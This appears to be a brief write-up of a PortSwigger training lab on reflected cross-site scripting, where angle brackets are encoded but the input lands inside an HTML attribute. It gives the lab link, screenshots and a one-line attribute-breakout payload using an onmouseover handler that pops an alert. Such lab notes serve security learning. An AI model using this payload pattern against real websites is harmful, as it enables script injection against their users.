# Reflected XSS into attribute with angle brackets HTML-encoded
Lab URL :- `https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded`

![image](https://user-images.githubusercontent.com/60841283/153721156-41685820-faff-450d-80a2-14a4aa4609cf.png)

Just avoid using angle brackets :- 

`https://security.stackexchange.com/questions/81824/cross-site-scripting-when-the-greater-than-and-less-than-signs-are-escaped`

Payload in search bar:- 
`" onmouseover="alert('GOTCHA')"`

![image](https://user-images.githubusercontent.com/60841283/153721084-796126b6-a174-4c29-adf0-6dce309548a1.png)
